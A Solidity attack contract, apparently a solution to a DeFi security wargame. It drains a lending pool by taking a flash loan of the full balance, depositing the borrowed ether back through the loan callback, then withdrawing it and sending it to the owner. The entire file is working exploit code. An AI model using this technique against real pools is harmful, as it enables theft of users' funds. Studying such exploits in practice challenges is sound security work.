pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface Pool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract AttackEntrance {
    Pool pool;
    address owner;

    constructor(address _pool, address _owner) {
        pool = Pool(_pool);
        owner = _owner;
    }

    function attack() public {
        uint256 balance = payable(address(pool)).balance;
        pool.flashLoan(balance);
        pool.withdraw();
        payable(address(owner)).send(payable(address(this)).balance);
    }

    function execute() external payable {
        pool.deposit{ value: msg.value }();
    }

    receive() external payable {}
}
